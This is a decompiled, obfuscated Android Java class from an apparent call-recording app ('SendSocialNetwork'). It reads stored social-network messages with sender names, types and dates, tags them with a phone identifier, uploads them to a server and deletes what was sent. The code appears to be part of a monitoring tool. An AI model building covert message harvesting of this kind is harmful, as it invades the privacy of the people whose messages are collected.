package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.L;
import a.c.b.o0;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendSocialNetwork */
public class q implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f293b;

    /* renamed from: a reason: collision with root package name */
    private final Context f294a;

    public q(Context context) {
        this.f294a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f294a.stopService(new Intent(this.f294a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public void run() {
        String str = "";
        try {
            if (f293b) {
                a();
                return;
            }
            f293b = true;
            o0 o0Var = new o0(this.f294a);
            o0Var.b();
            Cursor c2 = o0Var.c();
            if (c2 != null && c2.getCount() > 0) {
                while (c2.moveToNext()) {
                    L l = new L();
                    l.a(c2.getInt(0));
                    l.b(c2.getString(1));
                    l.c(c2.getString(2));
                    l.d(c2.getString(3));
                    l.a(c2.getString(4));
                    l.e(c2.getString(5));
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append(str);
                    sb.append(e.e(this.f294a));
                    hashMap.put("idPhone", sb.toString());
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str);
                    sb2.append(l.b());
                    hashMap.put("fullName", sb2.toString());
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(str);
                    sb3.append(l.d());
                    hashMap.put("message", sb3.toString());
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append(str);
                    sb4.append(l.e());
                    hashMap.put("type", sb4.toString());
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append(str);
                    sb5.append(l.a());
                    hashMap.put("date", sb5.toString());
                    if (a.b(l.f(), (Map<String, String>) hashMap)) {
                        o0Var.a(l.c());
                    }
                }
            }
            o0Var.a();
            if (c2 != null) {
                c2.close();
            }
            f293b = false;
            a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
